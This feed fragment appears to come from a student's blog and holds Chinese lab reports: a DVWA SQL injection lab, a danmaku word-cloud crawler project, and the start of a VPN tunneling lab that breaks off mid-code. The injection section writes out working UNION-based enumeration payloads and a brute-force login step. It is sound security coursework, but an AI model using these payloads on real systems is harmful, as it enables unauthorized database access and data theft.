    <link href="http://yoursite.com/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/"/>
    <id>http://yoursite.com/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</id>
    <published>2020-12-19T14:58:10.000Z</published>
    <updated>2020-12-20T14:26:22.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验基本原理-amp-目的"><a href="#实验基本原理-amp-目的" class="headerlink" title="实验基本原理&amp;目的"></a>实验基本原理&amp;目的</h2><blockquote><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p></blockquote><p>参考blog：<a href="https://www.jianshu.com/p/078df7a35671" target="_blank" rel="noopener">SQL注入基本原理</a></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="猜解数据库"><a href="#猜解数据库" class="headerlink" title="猜解数据库"></a>猜解数据库</h3><p><strong>Step1：理解PHP页面通过get方法传递参数</strong></p><p>当我们的sercurity level为low的时候，分析网页的html源码会发现是php的参数通过get方法来进行获取的</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p>而当时medium的时候，是通过POST来获取的，用户不再输入，而是仅能通过选择来进行</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><p><strong>Step 2：查看source code</strong></p><p>当安全级别为medium的时候，我们可以看到source code中的SQL查询语句为</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>那么当我们输入id（例如：1）之后，所构造的SQL的完整语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span>;</code></pre><p>意思是在名为<code>users</code>的表中找到<code>user_id</code>这个列中内容为<code>&quot;1&quot;</code>的那一条数据的<code>first_name</code>以及<code>last_name</code>的值</p><p>所以之后我们可以通过控制输入的参数id的值来调整执行的SQL语句</p><p><strong>Step 3：猜解SQL查询语句当中的字段数</strong></p><ul><li>（可能是在这里有输入的提示才不进行SQL注入类型的判断，但是正常情况下要实现判断注入的类型时字符型还是数字型）</li></ul><p>在这里通过<code>Burp Suit</code>输入<code>1&#39; order by 1#</code>，此时php所要执行的SQL语句就变为了</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">#';</span></code></pre><p>此时SQL会把#后面内容屏蔽来避免语句错误，但是此时会发现提示语法错误</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><p>在这里，根据参考<a href="https://yq.aliyun.com/articles/473535" target="_blank" rel="noopener">渗透学习笔记–基础篇–sql注入（数字型）</a>会发现是由于’ 被转义为了\，之后注入的时候只需要输入<code>1 order by 1#</code>即可</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><p>结果为</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-7.PNG" srcset="/img/loading.gif" alt="1-7"></p><p>同时测试<code>1 order by 2#</code>，发现也成功，但是到了order by 3#的时候，会发现出现错误，说明这个名为<code>users</code>的表应该是2列</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-8.PNG" srcset="/img/loading.gif" alt="1-8"></p><p><strong>Step 4：获取数据库名等信息</strong></p><p>在这里，我们构造<code>1 union select database(),user()</code></p><ul><li><code>database()</code>会返回当前网站所使用的数据库的名字</li><li><code>user()</code>会返回执行当前查询的用户的名字</li></ul><p>此时，SQL<strong>实际执行</strong>的语句应该为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span><span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-keyword">user</span>()<span class="hljs-comment">#;</span></code></pre><p>意思为，首先在user这个表中找到user_id 为1的first_name和last name两列，之后再<code>select database(), user()</code>，最后将两个select出的表格合并，之后返回html页面，如图显示，所以数据库名为<code>dvwa</code>，执行当前查询的用户的名字为<code>root@localhost</code></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-9.PNG" srcset="/img/loading.gif" alt="1-9"></p><p> <strong>Step 5：获取数据库版本以及操作系统信息</strong></p><p>在这里，我们输入的是<code>1 union select version(),@@version_compile_os#</code></p><ul><li><code>version()</code>获取当前数据库的版本信息</li><li><code>@@version_compile_os</code>获取当前操作系统信息</li></ul><p>此时，实际执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>(),@@version_compile_os<span class="hljs-comment">#;</span></code></pre><p>具体的意思可结合上面step和函数作用了解，执行结果为下图，我们可以了解当前数据库版本为<code>5.5.53</code>，操作系统为<code>win32</code></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p><strong>Step 6：获取数据库中的表名</strong></p><blockquote><p><code>information_schema</code> 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</p></blockquote><p>我们输入的内容为 <code>1&#39; union select table_name,table_schema from information_schema.tables where table_schema= &#39;dvwa&#39;#</code>，但是由于存在转义字符，所以可以采用16进制来写dvwa或者<code>database()</code>来代替，实际所执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> table_name,table_schema <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema= <span class="hljs-string">'dvwa'</span><span class="hljs-comment">#;</span></code></pre><p>结果如下</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>所以此时我们可以得到<code>dvwa</code>这个数据库下面有两个表，分别名为<code>guestbook</code>和<code>users</code></p><h3 id="验证绕过，级别为medium"><a href="#验证绕过，级别为medium" class="headerlink" title="验证绕过，级别为medium"></a>验证绕过，级别为medium</h3><p>首先来看能够正确验证，我们在<code>user</code>和<code>password</code>直接输入123，会发现提示此时账户/密码不正确</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后来看后台的php代码的具体运行情况，发现比较重要的是SQL的select语句以及后面呢条件判断，而当我们输入123的时候，实际执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'123'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'123'</span></code></pre><p>在这里好像有转义字符的限制，我们通过将捕获的包<code>Intruder</code>模块来实现，可以用暴力破解来实现，可以看到password的字段长度和其他的明显不一样（因为返回的正确信息的长度和错误信息的长度不一样），所以密码可能就是<code>password</code>，试验后发现成功login</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>4.1 判断是否存在注入漏洞</strong></p><p>一般我们进行判断的时候，在输入的参数后面加一个单引号，比如</p><pre><code class="hljs sql">http://xxx/abc.php?id=1'</code></pre><p>当页面返回错误的时候，说明是存在SQL注入的，因为无论字符型还是整型都会因为单引号个数不匹配而报错（比如在安全级别为low的时候，当我们输入1’的时候，会报语法错误）。</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>而如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤/转义，这时可以使用判断语句进行注入（比如在安全级别为medium的时候进行了转义）</p><p>*<em>4.2 判断注入类型是字符型还是数字型 *</em></p><p>当输入<code>and 1=1</code>，此时执行的SQL语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span></code></pre><p>如果此时成功，试验<code>and 1=2</code></p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span></code></pre><p>如果此时失败，则综合上面的，说明类型为数字型，因为如果注入类型为字符型，就会出现，此时并没有执行and语句后面的判断，所以不会出现上面一正一负的结果</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x and 1=1'</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x and 1=2'</span></code></pre><p>而当注入类型为字符型的时候，一般SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span></code></pre><p>此时通过 <code>and &#39;1&#39;=&#39;1</code> 和 <code>and &#39;1&#39;=&#39;2</code>来判断，因为此时的执行的SQL语句为（一正一负的结果）</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'x'</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'2'</span></code></pre><p>如果假设为数字型，则会变为下面的SQL语句，此时都会是语法错误</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> &lt;表名&gt; <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = x <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span><span class="hljs-string">select * from &lt;表名&gt; where id = x and '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">2</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;实验基本原理-amp-目的&quot;&gt;&lt;a href=&quot;#实验基本原理-amp-目的&quot; class=&quot;headerlink&quot; title=&quot;实验基本原理&amp;amp;目的&quot;&gt;&lt;/a&gt;实验基本原理&amp;amp;目的&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Sql 注入攻击是通过将恶</summary>
      
    
    
    
    
    <category term="Information System Securit" scheme="http://yoursite.com/tags/Information-System-Securit/"/>
    
  </entry>
  
  <entry>
    <title>爬虫PJ</title>
    <link href="http://yoursite.com/2020/12/17/%E7%88%AC%E8%99%ABPJ/"/>
    <id>http://yoursite.com/2020/12/17/%E7%88%AC%E8%99%ABPJ/</id>
    <published>2020-12-17T12:23:51.000Z</published>
    <updated>2020-12-18T13:31:52.840Z</updated>
    
    <content type="html"><![CDATA[<h1 id="设计文档"><a href="#设计文档" class="headerlink" title="设计文档"></a>设计文档</h1><p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><p align="right">同组人员：唐宸</p><h2 id="文档说明"><a href="#文档说明" class="headerlink" title="文档说明"></a>文档说明</h2><table><thead><tr><th align="center">文件</th><th align="center">作用说明</th></tr></thead><tbody><tr><td align="center"><strong>1.png</strong></td><td align="center"><strong>根据高频词制作的词云</strong></td></tr><tr><td align="center"><strong>cn_stopwords.txt</strong></td><td align="center"><strong>Github上面获取的常用中文停用词</strong></td></tr><tr><td align="center"><strong>movie4.csv</strong></td><td align="center"><strong>将另一位同学所爬数据整合后的源数据文件</strong></td></tr><tr><td align="center"><strong>PJ.py</strong></td><td align="center"><strong>主文件，具体实现</strong></td></tr><tr><td align="center"><strong>word_csv.csv</strong></td><td align="center"><strong>按照出现次数排序后制作出的词频统计</strong></td></tr></tbody></table><h2 id="负责部分"><a href="#负责部分" class="headerlink" title="负责部分"></a>负责部分</h2><p>在这一个part，我负责来实现对于另外一名同学通过爬虫爬取的数据的分词、词频统计以及制作词云的工作，此外，我还实现了2018-2020不同月份弹幕数量的对比（通过并列柱状图来显示）</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h3><p>首先，我们可以看到在原始的数据文件<code>movie.csv</code>当中（我将另一位同学爬取的三分数据放到了一个csv文件当中），这些原始数据还带有时间表示，在通过调用<code>jieba.lcut()</code>进行中文分词之后，对于一些我认为并不能反映实际意思的词语，我进行了删去，除此之外，对于一些常见的停用词，我从GitHub上面获取到了一个text文件，通过导入text文件来作为停用词的一个词典</p><p><strong>具体实现：</strong></p><pre><code class="hljs python">file = open(<span class="hljs-string">"movie4.csv"</span>, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">"utf-8"</span>)text = file.read()file.close()print(<span class="hljs-string">"读取成功,开始进行分词并制作词云"</span>)word_txt = jieba.lcut(text)    <span class="hljs-comment">#进行中文分词</span>stops_word = open(<span class="hljs-string">"cn_stopwords.txt"</span>, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">"utf-8"</span>).read()<span class="hljs-comment">#导入常见停用词词典</span>exclude = &#123;<span class="hljs-string">"马老师"</span>, <span class="hljs-string">"英国大力士"</span>, <span class="hljs-string">"婷婷"</span>, <span class="hljs-string">"不讲武德"</span>, <span class="hljs-string">"耗子尾汁"</span>, <span class="hljs-string">"哈哈哈哈"</span>, <span class="hljs-string">"没"</span>, <span class="hljs-string">"说"</span>,<span class="hljs-string">"真"</span>,<span class="hljs-string">"2020"</span>,<span class="hljs-string">"08"</span>,<span class="hljs-string">"01"</span>,<span class="hljs-string">"02"</span>,<span class="hljs-string">"03"</span>,<span class="hljs-string">"04"</span>,<span class="hljs-string">"05"</span>,<span class="hljs-string">"06"</span>,<span class="hljs-string">"07"</span>,<span class="hljs-string">"08"</span>,<span class="hljs-string">"09"</span>,<span class="hljs-string">"10"</span>,<span class="hljs-string">"11"</span>,<span class="hljs-string">"12"</span>,<span class="hljs-string">"13"</span>,<span class="hljs-string">"14"</span>,<span class="hljs-string">"15"</span>,<span class="hljs-string">"哈哈哈"</span><span class="hljs-string">"25"</span>,<span class="hljs-string">"26"</span>,<span class="hljs-string">"17"</span>,<span class="hljs-string">"30"</span>,<span class="hljs-string">"16"</span>,<span class="hljs-string">"18"</span>,<span class="hljs-string">"31"</span>,<span class="hljs-string">"22"</span>,<span class="hljs-string">"2018"</span>,<span class="hljs-string">"2019"</span>,<span class="hljs-string">"20"</span>,<span class="hljs-string">"21"</span>,<span class="hljs-string">"29"</span>,<span class="hljs-string">"19"</span>,<span class="hljs-string">"28"</span>,<span class="hljs-string">"27"</span>,<span class="hljs-string">"23"</span>,<span class="hljs-string">"24"</span>&#125;  <span class="hljs-comment">#自定义当前的停用词</span>stop_list = stops_word.split()stops_all = set(stop_list).union(set(stop_list), exclude) <span class="hljs-comment">#二者的并集</span>word_list = [element <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> word_txt <span class="hljs-keyword">if</span> element <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> stops_all]   <span class="hljs-comment">#去除停用词之后的word list</span></code></pre><p>此时我们已经对于实现了一部分分词，同时，针对于这部电影而言，可能有一些“专有名词”出现，例如：张麻子，让子弹飞等等，为了词频以及词云的准确性，我进行了添加</p><pre><code class="hljs python">jieba.add_word(<span class="hljs-string">"张麻子"</span>)    <span class="hljs-comment">#添加特殊的分词</span>jieba.add_word(<span class="hljs-string">"师爷"</span>)  jieba.add_word(<span class="hljs-string">"麻子"</span>)jieba.add_word(<span class="hljs-string">"讲真的"</span>)jieba.add_word(<span class="hljs-string">"让子弹飞"</span>)jieba.add_word(<span class="hljs-string">"名场面"</span>)</code></pre><p>此时我们其实已经完成了分词部分</p><h3 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h3><p>之后，我希望能够获取一个词频统计，根据词频统计来进行制作词云，在词频统计的时候，我又将一些可能出现的单个“词”进行来删去，比如“个”，“谁”等等，具体实现是根据上面筛过一轮之后产生的word_list再进行一轮筛选，将符合要求的词放入列表中，之后根据出现数量的大小进行<code>sort()</code>，并且把统计之后的结果打印并存储在<code>word_csv.csv</code>文件当中</p><p><strong>具体实现：</strong></p><pre><code class="hljs python"><span class="hljs-comment">#之后来实现对于词频的统计</span>word_dict = &#123;&#125;word_lists = []<span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> word_list:    <span class="hljs-keyword">if</span> len(word) == <span class="hljs-number">1</span>:        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">else</span>:        word_lists.append(word)             word_dict[word] = word_dict.get(word, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>wd = list(word_dict.items())    <span class="hljs-comment">#使字典列表化</span>wd.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)       <span class="hljs-comment">#排序</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):     <span class="hljs-comment">#生成前二十个高频的词</span>    print(wd[i])word_csv = wd       <span class="hljs-comment">#将结果写入到csv文件当中</span>pd.DataFrame(data=word_csv[<span class="hljs-number">0</span>:<span class="hljs-number">50</span>]).to_csv(<span class="hljs-string">'word_csv.csv'</span>, encoding=<span class="hljs-string">'UTF-8'</span>)print(<span class="hljs-string">"已经完成词频统计,可在文件夹1.png中查看词云"</span>)</code></pre><p><strong>运行结果：</strong></p><p><img src="/2020/12/17/%E7%88%AC%E8%99%ABPJ/1.PNG" srcset="/img/loading.gif" alt="1"></p><h3 id="词云制作"><a href="#词云制作" class="headerlink" title="词云制作"></a>词云制作</h3><p>在这里我们将根据上面已经筛选出的较为高频的50个词来进行制作词云，并且把结果存储在同文件夹下面的<code>1.png</code>当中</p><p><strong>具体实现：</strong></p><pre><code class="hljs python">string = <span class="hljs-string">" "</span>.join(word_lists)    <span class="hljs-comment">#拼接为字符串</span>w = wordcloud.WordCloud(background_color = <span class="hljs-string">"white"</span>, font_path = <span class="hljs-string">"C:\Windows\Fonts\STXINWEI.TTF"</span>, width=<span class="hljs-number">1000</span>,height=<span class="hljs-number">700</span>,random_state=<span class="hljs-number">42</span>)w.generate(string)w.to_file(<span class="hljs-string">"1.png"</span>)</code></pre><p><strong>运行结果：</strong></p><p><img src="/2020/12/17/%E7%88%AC%E8%99%ABPJ/2.png" srcset="/img/loading.gif" alt="2"></p><h3 id="统计图绘制"><a href="#统计图绘制" class="headerlink" title="统计图绘制"></a>统计图绘制</h3><p>在这里，为了能够得到一些对比出的分析，我将2018-2020不同月份的弹幕量分别统计下来，并用python进行绘制，在这里图片并没有保存，而是仅<code>plt.show()</code>展示</p><p><strong>具体实现：</strong></p><pre><code class="hljs python"><span class="hljs-comment"># 之后我希望通过柱状图来能够对于整体的信息有所了解</span>print(<span class="hljs-string">"开始绘制统计图,2018-2020年不同月份的弹幕数量的对比,注意此电影在2018.3之前不可看"</span>)y1 = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">16821</span>,<span class="hljs-number">5323</span>,<span class="hljs-number">4099</span>,<span class="hljs-number">3187</span>,<span class="hljs-number">5833</span>,<span class="hljs-number">3765</span>,<span class="hljs-number">2439</span>,<span class="hljs-number">3119</span>,<span class="hljs-number">3474</span>,<span class="hljs-number">2695</span>]y2 = [<span class="hljs-number">3212</span>,<span class="hljs-number">2190</span>,<span class="hljs-number">1406</span>,<span class="hljs-number">3312</span>,<span class="hljs-number">3217</span>,<span class="hljs-number">1849</span>,<span class="hljs-number">3359</span>,<span class="hljs-number">6051</span>,<span class="hljs-number">6271</span>,<span class="hljs-number">5890</span>,<span class="hljs-number">4500</span>,<span class="hljs-number">5029</span>]y3 = [<span class="hljs-number">6415</span>,<span class="hljs-number">7726</span>,<span class="hljs-number">10430</span>,<span class="hljs-number">7412</span>,<span class="hljs-number">23609</span>,<span class="hljs-number">18705</span>,<span class="hljs-number">41462</span>,<span class="hljs-number">42582</span>,<span class="hljs-number">12691</span>,<span class="hljs-number">12041</span>,<span class="hljs-number">12092</span>,<span class="hljs-number">2892</span>]x = np.arange(len(y3))tick_label = [<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'4'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'8'</span>,<span class="hljs-string">'9'</span>,<span class="hljs-string">'10'</span>,<span class="hljs-string">'11'</span>,<span class="hljs-string">'12'</span>] bar_width = <span class="hljs-number">0.25</span> plt.bar(x, y1, width=bar_width, label=<span class="hljs-string">'2018年'</span>)plt.bar(x + bar_width, y2, width=bar_width, label=<span class="hljs-string">'2019年'</span>)plt.bar(x + <span class="hljs-number">2</span> * bar_width, y3, width=bar_width, label=<span class="hljs-string">'2020年'</span>)plt.xlabel(<span class="hljs-string">"month"</span>)plt.ylabel(<span class="hljs-string">"number"</span>)plt.title(<span class="hljs-string">'Picture'</span>)plt.xticks(x+bar_width/<span class="hljs-number">2</span>, tick_label)plt.legend()plt.show()</code></pre><p><strong>运行结果：</strong></p><p><img src="/2020/12/17/%E7%88%AC%E8%99%ABPJ/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><ul><li><p><strong>分词以及词频部分</strong>：</p><ul><li>在这一个部分中，我认为比较重要的是字典的丰富性和针对性，在这一环节的工作中，我认为比较好的一点是我不仅针对于源数据进行了类似“专有名词”的添加以及通用和自己添加的停用词、还在制作词频的时候进一步进行来筛选，从而分析出的词云能够较好地反映出弹幕的热词</li></ul></li><li><p><strong>词云制作部分：</strong></p><ul><li>在这一个part，我们可以根据词云看到，一些电影里的“专有名词”是比较多的出现于弹幕当中的，例如：师爷、黄四郎等</li></ul></li><li><p><strong>统计图绘制</strong></p><ul><li>在这里，我们可以通过数据对比来分析出一些东西，例如在刚出现的2018年3月，此时弹幕数量是2018年最多的，此后数据发生起伏，而分析可得，很有可能与学生的寒暑假等相关，而之后比较显著的是在2020年的7月和8月，达到了到现在为止的最高弹幕数量（<strong>仅针对于这部电影而言</strong>），这一方面是因为寒暑假假期，另一方面我认为与疫情的关系也有很大关系</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;设计文档&quot;&gt;&lt;a href=&quot;#设计文档&quot; class=&quot;headerlink&quot; title=&quot;设计文档&quot;&gt;&lt;/a&gt;设计文档&lt;/h1&gt;&lt;p align=&quot;right&quot;&gt;姓名：贾昊龙
&lt;/p&gt;&lt;p align=&quot;right&quot;&gt;学号：18307130049
&lt;/p&gt;&lt;</summary>
      
    
    
    
    
    <category term="Information Content System" scheme="http://yoursite.com/tags/Information-Content-System/"/>
    
  </entry>
  
  <entry>
    <title>VPN-Tunneling</title>
    <link href="http://yoursite.com/2020/12/13/VPN-Tunneling/"/>
    <id>http://yoursite.com/2020/12/13/VPN-Tunneling/</id>
    <published>2020-12-13T09:30:25.000Z</published>
    <updated>2020-12-18T06:57:07.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>核心内容：了解VPN的两个基本部分（隧道以及加密），涉及到的板块/主题：VPN、TUN/TAP虚拟接口、IP隧道、路由</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="Task-1：网络设置"><a href="#Task-1：网络设置" class="headerlink" title="Task 1：网络设置"></a>Task 1：网络设置</h3><table><thead><tr><th align="center">VPN Client/Host U</th><th align="center">10.0.2.4</th></tr></thead><tbody><tr><td align="center"><strong>Gateway</strong></td><td align="center"><strong>10.0.2.5、192.168.60.1</strong></td></tr><tr><td align="center"><strong>Host V</strong></td><td align="center"><strong>192.168.60.101</strong></td></tr></tbody></table><ul><li><strong>U和VPN Server之间通信</strong></li></ul><p><img src="/2020/12/13/VPN-Tunneling/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><ul><li><strong>VPN Server和V之间进行通信</strong></li></ul><p><img src="/2020/12/13/VPN-Tunneling/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><ul><li><strong>Host U和Host V之间不能通信</strong></li></ul><p><img src="/2020/12/13/VPN-Tunneling/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><h3 id="Task-2：创建和配置TUN接口"><a href="#Task-2：创建和配置TUN接口" class="headerlink" title="Task 2：创建和配置TUN接口"></a>Task 2：创建和配置TUN接口</h3><p><a href="https://blog.kghost.info/2013/03/27/linux-network-tun/" target="_blank" rel="noopener">TUN/TAP设备</a></p><p><a href="https://cloud.tencent.com/developer/article/1432451" target="_blank" rel="noopener">TUN/TAP解析</a></p><p><img src="/2020/12/13/VPN-Tunneling/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h4 id="Task-2-a：接口命名"><a href="#Task-2-a：接口命名" class="headerlink" title="Task 2.a：接口命名"></a>Task 2.a：接口命名</h4><p>直接在py文件中把<code>tun%d</code>改为<code>jia%d</code>就行，结果如下</p><p><img src="/2020/12/13/VPN-Tunneling/2-2.png" srcset="/img/loading.gif" alt="2-2"></p><h4 id="Task-2-b：设置TUN接口"><a href="#Task-2-b：设置TUN接口" class="headerlink" title="Task 2.b：设置TUN接口"></a>Task 2.b：设置TUN接口</h4><p><img src="/2020/12/13/VPN-Tunneling/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>可以看到此时的<code>jia0</code>端口已经有了对应的IP地址192.168.53.99，并且端口已经打开</p><h4 id="Task-2-c：从TUN接口中读取"><a href="#Task-2-c：从TUN接口中读取" class="headerlink" title="Task 2.c：从TUN接口中读取"></a>Task 2.c：从TUN接口中读取</h4><p><img src="/2020/12/13/VPN-Tunneling/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><p>可以看到打印出来发往192.168.53.0/24的IP包的信息，因为调用了标准的read来从tun文件来读取数据</p><p>而当我们ping 192.168.60.0/24内的主机的时候，此时并没有打印出任何信息，因为tun接口的IP地址为192.168.53.99，和192.168.60.1不属于同一个子网，也没有设置相应的路由表项</p><p><img src="/2020/12/13/VPN-Tunneling/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><h4 id="Task-2-d：写入到TUN接口"><a href="#Task-2-d：写入到TUN接口" class="headerlink" title="Task 2.d：写入到TUN接口"></a>Task 2.d：写入到TUN接口</h4><p>如果是echo request包的时候，构造echo response包并写入</p><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># Get a packet from the tun interface</span>packet = os.read(tun, <span class="hljs-number">2048</span>)<span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:ip = IP(packet)<span class="hljs-comment"># print(ip.summary())</span><span class="hljs-keyword">if</span> ip.proto == <span class="hljs-number">1</span>: <span class="hljs-comment"># ICMP package</span>newip = IP(src = ip.dst, dst = ip.src)newpkt = newip/ICMP(type = <span 